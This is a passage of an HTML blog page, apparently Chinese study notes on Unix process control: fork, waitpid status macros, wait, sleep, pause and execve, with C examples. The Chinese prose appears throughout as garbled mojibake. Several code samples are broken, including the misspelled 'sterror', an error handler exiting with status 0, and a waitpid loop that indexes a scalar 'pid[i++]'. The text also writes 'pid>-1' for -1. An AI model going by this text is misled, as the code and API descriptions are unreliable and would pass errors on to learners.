å˜å¾—è‡ƒè‚¿éš¾æ‡‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®šä¹‰é”™è¯¯æŠ¥å‘Šå‡½æ•°æ¥ä¸€å®šç¨‹åº¦ä¸Šç®€åŒ–ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">unix_error</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: %s\n&quot;</span>,msg,sterror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä»¥åæˆ‘ä»¬çš„é”™è¯¯æ£€æŸ¥å°±å¯ä»¥å†™ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>((piad=fork())&lt;<span class="hljs-number">0</span>) unix_error(<span class="hljs-string">&quot;fork error&quot;</span>)<br></code></pre></td></tr></table></figure><p>é”™è¯¯å¤„ç†åŒ…è£…å‡½æ•°å¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–ä»£ç ï¼š</p><p>ã€‚å¯¹äºä¸€ä¸ªç»™å®šçš„åŸºæœ¬å‡½æ•° fooï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå…·æœ‰ç›¸åŒå‚æ•°çš„åŒ…è£…å‡½æ•°Fooï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™äº†ã€‚åŒ…è£…å‡½æ•°è°ƒç”¨åŸºæœ¬å‡½æ•°ï¼Œæ£€æŸ¥é”™è¯¯ï¼Œå¦‚æœæœ‰ä»»ä½•é—®é¢˜å°±ç»ˆæ­¢ã€‚æ¯”å¦‚ï¼Œä¸‹é¢æ˜¯ fork å‡½æ•°çš„é”™è¯¯å¤„ç†åŒ…è£…å‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-keyword">if</span> ((pid =fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»™å®šè¿™ä¸ªåŒ…è£…å‡½æ•°ï¼Œæˆ‘ä»¬å¯¹ fork çš„è°ƒç”¨å°±ç¼©å‡ä¸º 1 è¡Œ <code>pid = Fork();</code></p><h1 id="è¿›ç¨‹æ§åˆ¶"><a href="#è¿›ç¨‹æ§åˆ¶" class="headerlink" title="è¿›ç¨‹æ§åˆ¶"></a>è¿›ç¨‹æ§åˆ¶</h1><h3 id="è·å–è¿›ç¨‹ID"><a href="#è·å–è¿›ç¨‹ID" class="headerlink" title="è·å–è¿›ç¨‹ID"></a>è·å–è¿›ç¨‹ID</h3><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ­£æ•°è¿›ç¨‹ IDï¼ˆPIDï¼‰ã€‚</p><p><code>getpid()</code> å‡½æ•°è¿”å›è°ƒç”¨è¿›ç¨‹çš„ PIDï¼›<code>getppid()</code> å‡½æ•°è¿”å›å®ƒçš„çˆ¶è¿›ç¨‹çš„ PIDï¼ˆåˆ›å»ºè°ƒç”¨è¿›ç¨‹çš„è¿›ç¨‹ï¼‰ã€‚</p><h3 id="åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹"><a href="#åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹" class="headerlink" title="åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹"></a>åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹</h3><p>è¿›ç¨‹æ€»æ˜¯å¤„äºä¸‹é¢ä¸‰ç§çŠ¶æ€ä¹‹ä¸€ï¼š</p><ul><li>è¿è¡Œï¼šè¿›ç¨‹è¦ä¹ˆåœ¨ CPU ä¸Šæ‰§è¡Œï¼Œè¦ä¹ˆåœ¨ç­‰å¾…è¢«æ‰§è¡Œä¸”æœ€ç»ˆä¼šè¢«å†…æ ¸è°ƒåº¦ã€‚</li><li>åœæ­¢ï¼šè¿›ç¨‹çš„æ‰§è¡Œè¢«æŒ‚èµ·ï¼Œä¸”ä¸ä¼šè¢«è°ƒåº¦ã€‚å½“æ”¶åˆ° <code>SIGSTOP</code> ã€<code>SIGTSTP</code> ã€<code>SIGTTIN</code> æˆ–è€… <code>SIGTTOU</code> ä¿¡å·æ—¶ï¼Œè¿›ç¨‹å°±åœæ­¢ï¼Œå¹¶ä¸”ä¿æŒåœæ­¢ç›´åˆ°å®ƒæ”¶åˆ°ä¸€ä¸ª <code>SIGCONT</code> ä¿¡å·ï¼Œåœ¨è¿™ä¸ªæ—¶åˆ»ï¼Œè¿›ç¨‹å†æ¬¡å¼€å§‹è¿è¡Œã€‚</li><li>ç»ˆæ­¢ï¼šè¿›ç¨‹æ°¸è¿œåœ°åœæ­¢äº†ã€‚è¿›ç¨‹ä¼šå› ä¸ºä¸‰ç§åŸå› ç»ˆæ­¢ï¼šæ”¶åˆ°ç»ˆæ­¢è¿›ç¨‹çš„ä¸€ä¸ªä¿¡å·ã€ä»ä¸»ç¨‹åºè¿”å›ã€è°ƒç”¨ exit å‡½æ•°</li></ul><p>exit å‡½æ•°ä»¥ status é€€å‡ºçŠ¶æ€æ¥ç»ˆæ­¢è¿›ç¨‹ã€‚</p><p>çˆ¶è¿›ç¨‹ä½¿ç”¨ fork ç³»ç»Ÿè°ƒç”¨å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œä¸çˆ¶è¿›ç¨‹ä¸Šä¸‹æ–‡å‡ ä¹ä¸€è‡´çš„å­è¿›ç¨‹ã€‚</p><blockquote><p>è™½ç„¶çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹çš„åœ°å€ç©ºé—´å€¼ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯ä»–ä»¬ä¹‹é—´æ˜¯ç‹¬ç«‹çš„ã€‚</p></blockquote><p>fork è¢«<strong>è°ƒç”¨ä¸€æ¬¡ï¼Œè¿”å›ä¸¤æ¬¡</strong>ã€‚ä¸€æ¬¡æ˜¯åœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œä¸€æ¬¡æ˜¯æ–°å»ºç«‹çš„å­è¿›ç¨‹ä¸­ã€‚çˆ¶è¿›ç¨‹è¿”å›å­è¿›ç¨‹çš„ pidï¼Œå­è¿›ç¨‹è¿”å› 0ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨è¿”å›å€¼æ¥åŒºåˆ†æ˜¯çˆ¶è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹ã€‚</p><h3 id="å›æ”¶å­è¿›ç¨‹"><a href="#å›æ”¶å­è¿›ç¨‹" class="headerlink" title="å›æ”¶å­è¿›ç¨‹"></a>å›æ”¶å­è¿›ç¨‹</h3><p>å½“è¿›ç¨‹ç”±äºæŸç§åŸå› ç»ˆæ­¢æ—¶ï¼Œå†…æ ¸å¹¶ä¸æ˜¯ç«‹å³æŠŠä»–ä»å†…å­˜ä¸­æ¸…é™¤ã€‚ç›¸åï¼Œè¿›ç¨‹è¢«ä¿æŒåœ¨ä¸€ç§å·²ç»ç»ˆæ­¢çš„çŠ¶æ€ï¼Œç›´åˆ°è¢«ä»–çš„çˆ¶è¿›ç¨‹å›æ”¶ã€‚</p><p>ç»ˆæ­¢äº†ä½†æ˜¯æ²¡æœ‰è¢«å›æ”¶çš„è¿›ç¨‹å«åš<strong>åƒµæ­»è¿›ç¨‹</strong>ã€‚</p><p>å¦‚æœåƒµæ­»è¿›ç¨‹çš„çˆ¶è¿›ç¨‹è¿˜æ²¡æœ‰å°†åƒµæ­»è¿›ç¨‹å›æ”¶å°±ç»ˆæ­¢äº†ï¼Œé‚£ä¹ˆåƒµæ­»è¿›ç¨‹ä¼šå˜æˆ<strong>å­¤å„¿è¿›ç¨‹</strong>ï¼Œç”± <code>init</code> è¿›ç¨‹æˆä¸ºå®ƒçš„å…»çˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šç”± <code>init</code> å›æ”¶ã€‚</p><blockquote><p><code>init</code> è¿›ç¨‹ pid ä¸º 1ï¼Œæ˜¯åœ¨ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ç”±å†…æ ¸åˆ›å»ºçš„ï¼Œæ˜¯æ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–ç¥–å…ˆè¿›ç¨‹ã€‚å› ä¸ºåƒµæ­»è¿›ç¨‹å³ä½¿æ²¡æœ‰è¿è¡Œï¼Œä¾ç„¶è¦å ç”¨å†…å­˜èµ„æºã€‚</p></blockquote><p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è°ƒç”¨ <code>waitpid(pid_t pid,int *statusp,int options)</code> å‡½æ•°ç­‰å¾…å®ƒçš„å­è¿›ç¨‹ç»ˆæ­¢æˆ–è€…åœæ­¢ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ˆ<code>options=0</code>ï¼‰<code>waitpid</code> ä¸€æ—¦æ¥æ”¶åˆ°ç­‰å¾…é›†åˆä¸­çš„å…¶ä¸­ä¸€ä¸ªå­è¿›ç¨‹çš„ä¿¡å·ï¼Œå°±ä¼šç«‹åˆ»è¿”å›ã€‚</p><h4 id="åˆ¤å®šç­‰å¾…é›†åˆçš„æˆå‘˜"><a href="#åˆ¤å®šç­‰å¾…é›†åˆçš„æˆå‘˜" class="headerlink" title="åˆ¤å®šç­‰å¾…é›†åˆçš„æˆå‘˜"></a>åˆ¤å®šç­‰å¾…é›†åˆçš„æˆå‘˜</h4><p>ç­‰å¾…é›†åˆçš„æˆå‘˜æ˜¯ç”±å‚æ•° PID æ¥ç¡®å®šçš„ï¼š</p><ul><li><code>pid&gt;0</code>ï¼šç­‰å¾…è¿›ç¨‹æ˜¯ä¸€ä¸ªå•ç‹¬çš„å­è¿›ç¨‹ï¼Œå®ƒçš„è¿›ç¨‹ ID ç­‰äº pid</li><li><code>pid&gt;-1</code>ï¼šç­‰å¾…è¿›ç¨‹æ˜¯æœ‰çˆ¶è¿›ç¨‹æ‰€æœ‰çš„å­è¿›ç¨‹ç»„æˆ</li></ul><h4 id="ä¿®æ”¹é»˜è®¤è¡Œä¸º"><a href="#ä¿®æ”¹é»˜è®¤è¡Œä¸º" class="headerlink" title="ä¿®æ”¹é»˜è®¤è¡Œä¸º"></a>ä¿®æ”¹é»˜è®¤è¡Œä¸º</h4><p>å¯ä»¥é€šè¿‡å°† options è®¾ç½®ä¸ºå¸¸é‡ <code>WNOHANG</code> ã€<code>WUNTRACED</code> å’Œ <code>WCONTINUED</code> çš„å„ç§ç»„åˆæ¥ä¿®æ”¹é»˜è®¤è¡Œä¸ºï¼Œä¹Ÿå¯ä»¥ç”¨æˆ–è¿ç®—æŠŠè¿™äº›é€‰é¡¹ç»„åˆèµ·æ¥ï¼š</p><ul><li><p><strong>WNOHANGï¼š</strong></p><p>å®ƒä¼šä½¿è°ƒç”¨å˜ä¸ºéé˜»å¡ã€‚å¦‚æœå­˜åœ¨å¯ä»¥è·å–çŠ¶æ€çš„å­è¿›ç¨‹ï¼Œè¿”å›è¯¥å­è¿›ç¨‹çš„è¿›ç¨‹IDï¼›å¦‚æœæ²¡æœ‰å­è¿›ç¨‹é€€å‡ºï¼Œè¿”å› 0 è€Œä¸æ˜¯é˜»å¡ç­‰å¾…ã€‚</p></li><li><p><strong>WUNTRACEDï¼š</strong></p><p>å®ƒå…è®¸ç­‰å¾…è·å–å·²ç»åœæ­¢ï¼ˆä½†æœªç»ˆæ­¢ï¼‰çš„å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ã€‚é€šè¿‡è¿™ä¸ªæ ‡å¿—ï¼Œå¯ä»¥æ£€æµ‹åˆ°ç”±äºæ”¶åˆ° <code>SIGSTOP</code> ä¿¡å·è€Œæš‚åœçš„å­è¿›ç¨‹çš„çŠ¶æ€å˜åŒ–ã€‚</p></li><li><p><strong>WCONTINUEDï¼š</strong></p><p>ç”¨äºè·å–å­è¿›ç¨‹è¢«ç»§ç»­æ‰§è¡Œçš„çŠ¶æ€ä¿¡æ¯ã€‚å½“ä¸€ä¸ªè¿›ç¨‹æ”¶åˆ° <code>SIGCONT</code> ä¿¡å·å¹¶æ¢å¤æ‰§è¡Œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>WCONTINUED</code> æ ‡å¿—æ¥æ£€æµ‹åˆ°è¿™ç§çŠ¶æ€å˜åŒ–ã€‚</p></li></ul><h4 id="æ£€æŸ¥å·²å›æ”¶å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€"><a href="#æ£€æŸ¥å·²å›æ”¶å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€" class="headerlink" title="æ£€æŸ¥å·²å›æ”¶å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€"></a>æ£€æŸ¥å·²å›æ”¶å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€</h4><p>å¦‚æœ <code>statusp</code> å‚æ•°æ˜¯éç©ºçš„ï¼Œé‚£ä¹ˆ <code>waitpid</code> å°±ä¼šåœ¨ <code>status</code> ä¸­æ”¾ä¸Šå…³äºå¯¼è‡´è¿”å›çš„å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ã€‚</p><p><code>wait.h</code> å¤´æ–‡ä»¶å®šä¹‰äº†è§£é‡Š <code>status</code> å‚æ•°çš„å‡ ä¸ªå®ï¼š</p><ul><li>WIFEXITEDï¼šå¦‚æœäº†è¿›ç¨‹é€šè¿‡è°ƒç”¨ exit æˆ–è€…ä¸€ä¸ªè¿”å›ï¼ˆreturnï¼‰æ­£å¸¸ç»ˆæ­¢ï¼Œå°±è¿”å›çœŸ</li><li>WEXITSTATUSï¼šè¿”å›ä¸€ä¸ªæ­£å¸¸ç»ˆæ­¢çš„å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ã€‚åªæœ‰åœ¨ <code>WIFEXITED()</code> è¿”å›ä¸ºçœŸæ—¶ï¼Œæ‰ä¼šå®šä¹‰è¿™ä¸ªçŠ¶æ€ã€‚</li><li>WIFSIGNALEDï¼šå¦‚æœå­è¿›ç¨‹æ˜¯å› ä¸ºä¸€ä¸ªæœªè¢«æ•è·çš„ä¿¡å·ç»ˆæ­¢çš„ï¼Œé‚£ä¹ˆå°±è¿”å›çœŸã€‚</li><li>WTERMSIGï¼šè¿”å›å¯¼è‡´å­è¿›ç¨‹ç»ˆæ­¢çš„ä¿¡å·çš„ç¼–å·ã€‚åªæœ‰åœ¨ <code>WIFSIGNALED()</code> è¿”å›ä¸ºçœŸæ—¶ï¼Œæ‰å®šä¹‰è¿™ä¸ªçŠ¶æ€ã€‚</li><li>WIFSTOPPEDï¼šå¦‚æœå¼•èµ·è¿”å›çš„å­è¿›ç¨‹å½“å‰æ˜¯åœæ­¢çš„ï¼Œé‚£ä¹ˆå°±è¿”å›çœŸã€‚</li><li>WSTOPSIGï¼šè¿”å›å¼•èµ·å­è¿›ç¨‹åœæ­¢çš„ä¿¡å·çš„ç¼–å·ï¼Œåªæœ‰åœ¨ <code>WIFSTOPPED()</code> è¿”å›ä¸ºçœŸæ—¶ï¼Œæ‰å®šä¹‰è¿™ä¸ªçŠ¶æ€ã€‚</li><li>WIFCONTINUEDï¼šå¦‚æœå­è¿›ç¨‹æ”¶åˆ° <code>SIGCONT</code> ä¿¡å·é‡æ–°å¯åŠ¨ï¼Œåˆ™è¿”å›çœŸ</li></ul><h4 id="é”™è¯¯æ¡ä»¶"><a href="#é”™è¯¯æ¡ä»¶" class="headerlink" title="é”™è¯¯æ¡ä»¶"></a>é”™è¯¯æ¡ä»¶</h4><p>å¦‚æœè°ƒç”¨è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œé‚£ä¹ˆ waitpid è¿”å› -1ï¼Œå¹¶ä¸”è®¾ç½® errno ä¸º <code>ECHILD</code> ã€‚å¦‚æœ waitpid å‡½æ•°è¢«ä¸€ä¸ªä¿¡å·ä¸­æ–­ï¼Œé‚£ä¹ˆå®ƒè¿”å› -1ï¼Œå¹¶è®¾ç½® errno ä¸º <code>EINTR</code>ã€‚</p><h4 id="waitå‡½æ•°"><a href="#waitå‡½æ•°" class="headerlink" title="waitå‡½æ•°"></a>waitå‡½æ•°</h4><p>wait å‡½æ•°æ—¶ waitpid å‡½æ•°çš„ç®€å•ç‰ˆæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">wait</span><span class="hljs-params">(<span class="hljs-type">int</span> *statusp)</span>;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨ <code>wait(&amp;status)</code> ç­‰åŒäº <code>waitpid(-1,&amp;status,0)</code>ã€‚</p><h4 id="ä½¿ç”¨-waitpid-çš„å®ç¤ºä¾‹"><a href="#ä½¿ç”¨-waitpid-çš„å®ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ waitpid çš„å®ç¤ºä¾‹"></a>ä½¿ç”¨ waitpid çš„å®ç¤ºä¾‹</h4><p>ç»™äº†ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;error.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">int</span> status;<br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;   <span class="hljs-comment">//çˆ¶è¿›ç¨‹åˆ›å»ºNä¸ªå­è¿›ç¨‹</span><br>        <span class="hljs-keyword">if</span>((pid=fork())==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">100</span>+i);   <span class="hljs-comment">//å­è¿›ç¨‹é€€å‡º</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>((pid=waitpid(<span class="hljs-number">-1</span>,&amp;status,<span class="hljs-number">0</span>))&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(WIFEXITED(status))&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child %d exit with code %d normally\n&quot;</span>,pid,WEXITSTATUS(status));<br>        &#125;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œç¨‹åºä¸ä¼šæŒ‰ç…§é¡ºåºå›æ”¶å­è¿›ç¨‹ï¼Œè¿™å–å†³äºè¿è¡Œçš„æœºå™¨çš„è°ƒåº¦ã€‚è¿™æ˜¯éç¡®å®šæ€§è¡Œä¸ºçš„ä¸€ä¸ªå®ä¾‹ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å¼ºåˆ¶ç”¨ä»£ç æ¥æ§åˆ¶å­è¿›ç¨‹çš„å›æ”¶é¡ºåºã€‚å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ•°ç»„ä¿å­˜ pidï¼Œæ¯æ¬¡å¾ªç¯åªå›æ”¶æŒ‡å®šè¿›ç¨‹ï¼Œä½†æ˜¯è¿™ä¾ç„¶ä¸èƒ½ä¿è¯å­è¿›ç¨‹ä¼šæŒ‰é¡ºåºç»“æŸï¼Œä½†æ˜¯ä¸€å®šä¼šæŒ‰é¡ºåºå›æ”¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;error.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">int</span> status;<br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;   <span class="hljs-comment">//çˆ¶è¿›ç¨‹åˆ›å»ºNä¸ªå­è¿›ç¨‹</span><br>        <span class="hljs-keyword">if</span>((pid=fork())==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">100</span>+i);   <span class="hljs-comment">//å­è¿›ç¨‹é€€å‡º</span><br>        &#125;<br>    &#125;<br>    i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>((pid=waitpid(pid[i++],&amp;status,<span class="hljs-number">0</span>))&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(WIFEXITED(status))&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child %d exit with code %d normally\n&quot;</span>,pid,WEXITSTATUS(status));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è®©ç¨‹åºè¿›å…¥ä¼‘çœ "><a href="#è®©ç¨‹åºè¿›å…¥ä¼‘çœ " class="headerlink" title="è®©ç¨‹åºè¿›å…¥ä¼‘çœ "></a>è®©ç¨‹åºè¿›å…¥ä¼‘çœ </h3><p>sleepå‡½æ•°å°†ä¸€ä¸ªç¨‹åºæŒ‚èµ·ä¸€æ®µæŒ‡å®šçš„æ—¶é—´ï¼Œå¦‚æœè¯·æ±‚çš„æ—¶é—´åˆ°äº†ï¼Œsleepè¿”å›0ï¼Œå¦åˆ™è¿”å›å‰©ä¸‹çš„éœ€è¦ä¼‘çœ çš„ç§’æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">(insigned <span class="hljs-type">int</span> secs)</span>;<br></code></pre></td></tr></table></figure><p>pauseå‡½æ•°ä¹Ÿæ˜¯è®©ç¨‹åºä¼‘çœ ï¼Œç›´åˆ°è¯¥è¿›ç¨‹æ”¶åˆ°ä¿¡å·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pause</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h3 id="åŠ è½½å¹¶è¿è¡Œç¨‹åº"><a href="#åŠ è½½å¹¶è¿è¡Œç¨‹åº" class="headerlink" title="åŠ è½½å¹¶è¿è¡Œç¨‹åº"></a>åŠ è½½å¹¶è¿è¡Œç¨‹åº</h3><p><code>execve(const char *filename,const char *argv[,const char *env[])</code> å‡½æ•°ç”¨äºåœ¨å½“å‰è¿›ç¨‹ä¸­åŠ è½½å¹¶è¿è¡Œä¸€ä¸ªæ–°çš„ç¨‹åºå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ <em>filename</em> ã€‚<code>execve</code> è°ƒç”¨ä¸€æ¬¡å°±æ— æ³•è¿”å›äº†ï¼Œé™¤éåŠ è½½å¤±è´¥ï¼ˆä¾‹å¦‚æ‰¾ä¸åˆ° <em>filename</em> è¿™ä¸ªæ–‡ä»¶ï¼‰å¹¶è¿”å›é”™è¯¯ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼ŒåŠ è½½çš„ç¨‹åºä¼šä»¥è¿™æ ·çš„å…¥å£å»åŠ è½½ <code>int main(int argc,char *argv[],char *env[])</code>ï¼Œè¿™é‡Œ <code>execve</code> çš„åé¢ä¸¤ä¸ªå‚æ•°å°±æ˜¯è¿™é‡Œçš„å‚æ•°ã€‚</p><p>å¯¹äºç¯å¢ƒå˜é‡ï¼ŒLinux æä¾›äº†å‡ ä¸ªå‡½æ•°æ¥æ“ä½œç¯å¢ƒå˜é‡ï¼š</p><ul><li><p><code>char *getenv(char *name)</code> ç”¨äºè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒæˆåŠŸå°±è¿”å› <code>value</code> çš„æŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯ <code>value</code> çš„æŒ‡é’ˆï¼Œä¸æ˜¯ä¸€æ•´ä¸ªæ¡ç›®çš„æŒ‡é’ˆï¼Œå¤±è´¥å°±è¿”å› <code>NULL</code>ã€‚</p></li><li><p><code>int setenv(const char *name,const char *newvalue,int overwrite)</code> ç”¨äºç»™ç¯å¢ƒå˜é‡ <code>name</code> è®¾ç½®ä¸€ä¸ªæ–°çš„å€¼ <code>newvalue</code>ï¼Œå¦‚æœå·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆåˆ¤æ–­ <code>overwrite</code> æ˜¯å¦é 0ï¼Œé 0 åˆ™ç›´æ¥æ›¿æ¢ã€‚</p></li><li><p><code>void unsetenv(char *name)</code> ç”¨äºå–æ¶ˆä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚</p></li></ul><p>æ®æ­¤æˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€ä¸ªç®€æ˜“çš„ SHELL ç¨‹åºï¼Œåˆ©ç”¨ <code>fork</code> å’Œ <code>execve</code> çš„æ­é…å°±å¯ä»¥è§£å†³ï¼Œä¸»è¦å·¥ä½œé‡è¿˜æ˜¯åœ¨è§£æå‘½ä»¤ä¸Šé¢ã€‚</p><h4 id="åˆ©ç”¨-fork-å’Œ-execve-è¿è¡Œç¨‹åº"><a href="#åˆ©ç”¨-fork-å’Œ-execve-è¿è¡Œç¨‹åº" class="headerlink" title="åˆ©ç”¨ fork å’Œ execve è¿è¡Œç¨‹åº"></a>åˆ©ç”¨ fork å’Œ execve è¿è¡Œç¨‹åº</h4><p>æˆ‘ä»¬åªè¦ <code>fork</code> å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åå­è¿›ç¨‹ç”¨äº <code>execve</code> 